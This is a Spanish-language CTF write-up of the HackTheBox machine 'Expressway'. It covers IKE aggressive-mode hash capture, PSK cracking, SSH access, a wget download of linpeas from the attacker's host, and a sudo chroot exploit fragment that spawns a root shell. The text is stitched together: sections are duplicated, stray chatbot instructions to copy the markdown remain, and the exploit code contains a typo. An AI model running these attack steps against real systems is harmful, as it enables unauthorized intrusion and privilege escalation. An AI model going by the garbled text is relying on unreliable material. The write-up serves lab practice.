# HackTheBox: Expressway - Writeup 🛣️

## Introducción

**"Interstate 500"**: Las sugerencias de CTF suelen ser lúdicas, y "Interstate 500" es un recordatorio para comprobar el **puerto UDP 500**. **UDP/500** es el puerto conocido para **IPsec IKE** (Internet Key Exchange), el protocolo utilizado para configurar túneles VPN/IPsec. En los CTF, esto puede ser interesante porque:

* IKE puede filtrar información de identidad en ciertos modos (**modo agresivo**).
* Un IPsec mal configurado o **claves precompartidas (PSK) débiles** pueden usarse de forma indebida para autenticar o extraer información.
* Algunos CTF ocultan servicios detrás de una VPN o exponen un servicio IKE que revela datos útiles.

***

## Paso 1: Verificación de Conectividad con `ping` 🟢

El primer paso en cualquier prueba de penetración o CTF es verificar la **conectividad** básica con la máquina objetivo. Utilizamos la herramienta `ping` para enviar paquetes ICMP y confirmar que la máquina objetivo está en línea y accesible.

### Comando Ejecutado

Ejecutamos `ping` con el modificador `-c 4` para limitar el número de paquetes a cuatro, evitando un barrido continuo.

```bash
ping -c 4 10.10.11.87
````

<img width="524" height="172" alt="Ping" src="https://github.com/user-attachments/assets/574f8ce5-ed1e-4520-b806-408bea03bdd8" />

Como se observa en la captura, se transmitieron y recibieron 4 paquetes con una pérdida del 0%, confirmando que la máquina objetivo con la IP 10.10.11.87 está en línea y es totalmente accesible.

## Paso 2: Escaneo de Puertos con Nmap 🔎

Una vez confirmada la conectividad, procedemos a identificar los servicios que se ejecutan en la máquina objetivo utilizando **Nmap**. Dada la pista de "Interstate 500" (UDP/500), realizamos escaneos TCP y UDP de forma específica.

### 2.1. Escaneo de Puertos TCP

Se realizó un escaneo TCP para identificar servicios comunes, versiones (`-sV`) y el sistema operativo (`-O`).

### Comando Ejecutado

```bash
nmap -sC -sV -A -Pn 10.10.11.87
````

<img width="902" height="481" alt="Nmap tcp" src="https://github.com/user-attachments/assets/d96b3881-719a-4dad-a08f-441585743331" />


El Paso 2: Escaneo con Nmap ya está listo.

A continuación, está el contenido en formato Markdown. Por favor, copia el texto y añádelo a tu archivo expressway_writeup.md para continuar con el writeup.

Markdown
## Paso 2: Escaneo de Puertos con Nmap 🔎

Una vez confirmada la conectividad, procedemos a identificar los servicios que se ejecutan en la máquina objetivo utilizando **Nmap**. Dada la pista de "Interstate 500" (UDP/500), realizamos escaneos TCP y UDP de forma específica.

### 2.1. Escaneo de Puertos TCP

Se realizó un escaneo TCP para identificar servicios comunes, versiones (`-sV`) y el sistema operativo (`-O`).

### Comando Ejecutado

```bash
nmap -sC -sV -A -Pn 10.10.11.87
````
Resultados del Escaneo TCP
````
Puerto	Estado	Servicio	Versión
22/tcp	open	ssh	OpenSSH 10.0p2 Debian 8 (protocol 2.0)
````
El único puerto TCP abierto es el 22 que aloja un servicio SSH. Aunque es una vía de acceso potencial, generalmente es el último recurso sin credenciales válidas.

2.2. Escaneo de Puertos UDP y Script IKE

Debido a la sugerencia "Interstate 500", dirigimos nuestra atención al protocolo UDP, específicamente al puerto 500/udp, el cual se utiliza para IPsec IKE.

Utilizamos el script de Nmap ike-version para interactuar directamente con el servicio IKE y buscar posibles filtraciones de información, como nombres de grupos o ID de usuario.

Comando Ejecutado
````
Bash

sudo nmap -sU -p 500,4500 -Pn --script=ike-version -vv 10.10.11.87
````

<img width="677" height="533" alt="nmap udp" src="https://github.com/user-attachments/assets/df562611-aa4f-40e1-bfa7-4f7c902e3e79" />

Resultados del Escaneo UDP
````
Puerto,Estado,Servicio,Razón
500/udp,open,isakmp,udp-response ttl 63
4500/udp,open,nat-t-ike,no-response
````
El escaneo confirma que el puerto 500/udp está abierto y corriendo el servicio isakmp (Internet Security Association and Key Management Protocol), que es el estándar para IKE.

## Paso 3: Enumeración del Puerto TFTP (UDP/69) 💾

Aunque la pista principal apuntaba al puerto UDP/500, un escaneo exhaustivo a menudo revela otros servicios. Al revisar el rango UDP, se descubrió que el puerto **69/udp** estaba abierto, lo que sugiere la presencia del **Trivial File Transfer Protocol (TFTP)**.

### 3.1. Detección y Enumeración con Nmap

Primero, confirmamos el puerto y usamos el *script* de Nmap `tftp-enum` para intentar listar archivos comunes o disponibles en el servidor.

### Comando Ejecutado

```bash
nmap -sU -p69 --script tftp-enum 10.10.11.87
````
<img width="551" height="210" alt="enumero p69" src="https://github.com/user-attachments/assets/72f41af7-a650-4911-af0f-c06e7cbc0201" />

El script de Nmap fue exitoso e identificó un archivo: ciscortr.cfg. Este es un nombre de archivo estándar para la configuración de un router Cisco.

3.2. Descarga y Análisis del Archivo de Configuración

Procedemos a usar el cliente tftp para descargar el archivo y analizar su contenido.

Comandos Ejecutados
````
Bash

tftp 10.10.11.87
get ciscortr.cfg
quit
cat ciscortr.cfg
````
<img width="1151" height="720" alt="me descargo el archivo del p69 no tiene nada relevante " src="https://github.com/user-attachments/assets/2c8abf15-fe6c-43b2-842b-84edcbcf9c95" />

Se intentó primero un ls sin éxito, luego se procedió a la descarga directa del archivo.

Análisis de ciscortr.cfg

El archivo ciscortr.cfg contiene la configuración completa del router Cisco, lo que es una fuente rica en información.

Credenciales Hash (Usuario ike)

Una sección clave revela un nombre de usuario y una contraseña cifrada.

Una sección clave revela un nombre de usuario y una contraseña cifrada.
````
username ike password *****
````
Esta no es la contraseña en texto plano, sino una versión hash (probablemente cifrado tipo 7 de Cisco).

## Paso 4: Extracción de Hash a través de IKE (UDP/4500) 🔑

El archivo de configuración nos proporcionó una P**S**K (`secret-password`) y un ID de grupo (`rtr-remote`). Sin embargo, la máquina objetivo (10.10.11.87) probablemente espera credenciales de usuario para la autenticación en el modo IKE agresivo.

Utilizaremos la herramienta `ike-scan` para forzar el modo agresivo y, crucialmente, para extraer un *hash* de autenticación que pueda ser descifrado *offline*.

<img width="1710" height="647" alt="ahora scaneamos el p4500 ike donde tenemos ub hash y usuario correo electronico" src="https://github.com/user-attachments/assets/7c2646fd-99e3-4cea-9ff3-9699e70eb3dc" />

### 4.1. Uso de `ike-scan` en Modo Principal (Main Mode)

Primero, un escaneo simple confirma la existencia del servicio IKE.

### Comando Ejecutado (Main Mode)

```bash
ike-scan 10.10.11.87
````
Markdown

## Paso 4: Extracción de Hash a través de IKE (UDP/4500) 🔑

El archivo de configuración nos proporcionó una P**S**K (`secret-password`) y un ID de grupo (`rtr-remote`). Sin embargo, la máquina objetivo (10.10.11.87) probablemente espera credenciales de usuario para la autenticación en el modo IKE agresivo.

Utilizaremos la herramienta `ike-scan` para forzar el modo agresivo y, crucialmente, para extraer un *hash* de autenticación que pueda ser descifrado *offline*.

### 4.1. Uso de `ike-scan` en Modo Principal (Main Mode)

Primero, un escaneo simple confirma la existencia del servicio IKE.

### Comando Ejecutado (Main Mode)

```bash
ike-scan 10.10.11.87
````
Resultados

El escaneo en Main Mode confirma la configuración de la política IKE (3DES, SHA1, Grupo 2) pero no revela información de autenticación.

4.2. Uso de ike-scan en Modo Agresivo (Aggressive Mode)

Para forzar la revelación del hash de autenticación, usamos el Modo Agresivo. Este modo es más vulnerable a la enumeración y nos permite enviar una identidad fake (-n fakeID) para obtener la respuesta del servidor, que incluye un hash de autenticación.

Comando Ejecutado (Aggressive Mode)

Para el escaneo, usamos el puerto UDP/4500 (-p 4500) ya que el router lo usa para el NAT Traversal (NAT-T) en la negociación IPsec. Además, utilizamos la identidad de dominio descubierta en el archivo de configuración (-n expressway.htb).
````
Bash

ike-scan -M -P -n expressway.htb -A -p 4500 10.10.11.87
````
Resultados de la Extracción del Hash

El escaneo en Modo Agresivo es exitoso y devuelve la respuesta del servidor, incluyendo el hash de autenticación.
````
IKE PSK parameters (g_x,g_y,ckey,rkey,h_isakp,bidi,bidi_bin,b,hash_r):
{hash_data}
````
El hash de autenticación, que incluye el secreto precompartido del grupo (secret-password) y la identidad del usuario, es el siguiente (eliminando los parámetros y dejando solo la data binaria). Este hash lo guardo para descifrarlo luego.

## Paso 5: Captura y Crackeo del PSK

Este paso se centró en la explotación de la fase IKE (Internet Key Exchange) para obtener y luego descifrar la clave precompartida (PSK) utilizada en la VPN.

### 1. Captura de Parámetros PSK con `ike-scan`

<img width="1707" height="141" alt="hago un ike scan para obtener paramtros psk" src="https://github.com/user-attachments/assets/31e79713-9df3-412e-b28b-e17fc2c39d52" />

Se utilizó `ike-scan` en **Modo Agresivo** (`-A`) para forzar un *handshake* y capturar los parámetros de la PSK, guardándolos en un archivo llamado `presharedkey.txt`.

| Comando Ejecutado | `sudo ike-scan -A -id=ike@expressway.htb --presharedkey.txt 10.10.11.87` |
| :--- | :--- |
| **Resultado** | La herramienta retornó un **Aggressive Mode Handshake**. |

### 2. Crackeo de la PSK con `psk-crack`

<img width="881" height="147" alt="ejecuto psk crack" src="https://github.com/user-attachments/assets/42337b91-4bcc-48a6-b85b-f9809696247b" />

El archivo `presharedkey.txt` capturado fue procesado con la herramienta `psk-crack`, utilizando un ataque de diccionario (`-d`) con la lista `rockyou.txt`.

| Comando Ejecutado | `sudo psk-crack -d /home/quiqu3h4ck@kali/rockyou.txt presharedkey.txt` |
| :--- | :--- |
| **Clave (PSK) Encontrada** | `freakingrockstarontheroad` |
| **Hash SHA1 Correspondiente** | `e5e50b8d2e145cbb842190db41adda690c5cae55` |

## Paso 6: Conexión SSH y Obtención de la Bandera del Usuario

Una vez obtenida la clave precompartida (PSK) en el paso anterior, se procedió a intentar la conexión a través del servicio **SSH** (puerto 22 TCP, abierto según Nmap), utilizando el nombre de usuario y la clave descubiertos.

### 1. Conexión SSH

Se utilizó el usuario **`ike`** (identificado en la configuración del *router* y en los *handshakes* IKE) y la clave crackeada (`freakingrockstarontheroad`) como contraseña.

<img width="936" height="292" alt="me conetco por ssh y obtengo flag user" src="https://github.com/user-attachments/assets/926cffe5-59bc-4e85-856c-549a60ac4dcf" />

| Comando Ejecutado | `ssh ike@10.10.11.87` |
| :--- | :--- |
| **Credenciales** | **Usuario:** `ike` / **Contraseña:** *PSK crackeada* (asumido) |

```bash
quiqu3h4ck@kali:~/Maquinas/Expressway HTB]$ ssh ike@10.10.11.87
ike@10.10.11.87's password: 
Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77 on ssh
Linux expressway.htb 6.1.67-dev14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.67-1 (2025-09-11) x86_64
# ... (Mensaje de bienvenida omitido)
````

2. Obtención de la Bandera del Usuario

Una vez dentro del shell de la máquina remota, obtengo el archivo de la bandera del usuario (user.txt).

## Paso 7: Enumeración Local con Linpeas y Descubrimiento de SUID

Con el acceso de usuario (`ike`) asegurado, el objetivo fue realizar una enumeración local para identificar rutas de escalada de privilegios, típicamente buscando binarios con permisos especiales o configuraciones vulnerables.

### 1. Descarga del Script de Enumeración Linpeas

Se inició un servidor HTTP en la máquina atacante para servir el *script* de enumeración `linpeas.sh` y se descargó desde el host comprometido.

<img width="1688" height="414" alt="me descargo linpeas en el usuario" src="https://github.com/user-attachments/assets/60c32018-3c88-43a2-afcf-109ffc17c579" />

| Acción | Detalle |
| :--- | :--- |
| **Comando de Descarga** | `wget http://10.10.14.195:8000/linpeas.sh` |
| **Resultado** | El archivo `linpeas.sh` fue descargado exitosamente en el directorio del usuario `ike`. |

### 2. Análisis y Descubrimiento de Binarios SUID

Tras la ejecución de `linpeas.sh` (o un comando similar de enumeración), se identificaron archivos binarios con el *bit* SUID (Set User ID) activado, lo que permite a un usuario ejecutar el archivo con los privilegios de su propietario (en muchos casos, *root*).

<img width="1305" height="362" alt="vulnerable sudo" src="https://github.com/user-attachments/assets/efc1ba60-4219-419c-9014-3fd328521d16" />


| Categoría | Binarios SUID Encontrados (Parcial) |
| :--- | :--- |
| **Interesantes** | `/usr/bin/sudo`, `/usr/bin/mount`, `/usr/bin/gpasswd`, `/usr/bin/umount`, `/usr/bin/newgrp`, etc. |
| **Vector de Escalada** | El binario `/usr/bin/sudo` fue señalado específicamente para "verificar si la versión de sudo es vulnerable", indicándolo como un objetivo potencial para la escalada a *root*. |

## Paso 8: Verificación de la Versión de Sudo y Búsqueda de Exploit

El paso anterior identificó el binario SUID `/usr/bin/sudo` como un posible vector de escalada de privilegios. Este paso se dedicó a confirmar la versión del *software* y encontrar un *exploit* conocido para ella.

<img width="1625" height="463" alt="elevacion de privilegios mediante exploit " src="https://github.com/user-attachments/assets/ded6acb6-0426-407f-a8eb-f3cbb5905926" />

### 1. Verificación de la Versión de Sudo Instalada

Desde la sesión SSH, se ejecutó `sudo -V` para obtener los detalles de la versión del programa.

| Comando Ejecutado | `sudo -V` |
| :--- | :--- |
| **Versión Identificada** | `Sudo version 1.9.17` |
| **Plugin Version** | `Sudoers policy plugin version 1.9.17` |

### 2. Búsqueda de Exploit en Exploit Database

Utilizando la versión exacta (`1.9.17`), se buscó en bases de datos públicas de vulnerabilidades para encontrar un *exploit* funcional.

| Hallazgo | Detalle |
| :--- | :--- |
| **Título del Exploit** | `Sudo 1.9.17 Host Option - Elevation of Privilege` |
| **EBD-ID** | `52354` |
| **CVE** | `2025-32462` |
| **Plataforma** | `LINUX` |

Este descubrimiento proporciona el vector exacto para el siguiente paso, que será la elevación de privilegios a *root*.

## Paso 9: Creación y Ejecución del Exploit de Sudo

Habiendo identificado la vulnerabilidad de Sudo (`1.9.17`) en el paso anterior, este paso final se centró en la creación y ejecución de un *exploit* para escalar privilegios a *root* y obtener la bandera final.

### 1. Creación del Script de Exploit

Se creó un *script* de *shell* llamado `exploit.sh` basado en la Prueba de Concepto (PoC) para el CVE. El código utiliza un *bypass* de Sudo (`sudo-chwoot.sh`) para cargar una librería NSS maliciosa que fuerza la ejecución de una *shell* con privilegios elevados.

<img width="963" height="443" alt="me creo el exploit " src="https://github.com/user-attachments/assets/bc0807fb-4ea4-4064-abeb-87195132b998" />

El código de la librería inyectada (`woot1337.c`) contiene las funciones clave:
* `setreuid(0,0)` y `setregid(0,0)`: Cambian el ID de usuario y grupo efectivos a *root* (UID/GID 0).
* `exec1("/bin/bash", ...)`: Ejecuta una *shell* de Bash con los nuevos privilegios.

```bash
# Fragmento del código del exploit.sh
__attribute__((constructor))
void woot(void) {
	setreuid(0,0);  /* change to UID 0 */
	setregid(0,0);  /* change to GID 0 */
	chdir("/");     /* exit from chroot */
	exec1("/bin/bash", "/bin/bash", NULL); /* root shell */
}
````
2. Ejecución del Exploit y Escalada de Privilegios

El script se preparó y ejecutó para obtener la shell de root.
````
Acción,Comando,Detalle
Habilitar Ejecución,chmod +x exploit.sh,"El intento inicial falló por ""Permission denied"", requiriendo permisos de ejecución."
Ejecutar Exploit,./exploit.sh,La ejecución exitosa resultó en una shell con el usuario root.
````

````
Bash
ike@expressway:~$ chmod +x exploit.sh
ike@expressway:~$ ./exploit.sh 
# ...
[•] Running exploit...
root@expressway:/# whoami
root
````
3. Obtención de la Bandera Root

Finalmente, se navegó al directorio /root para leer el archivo root.txt y completar la máquina.







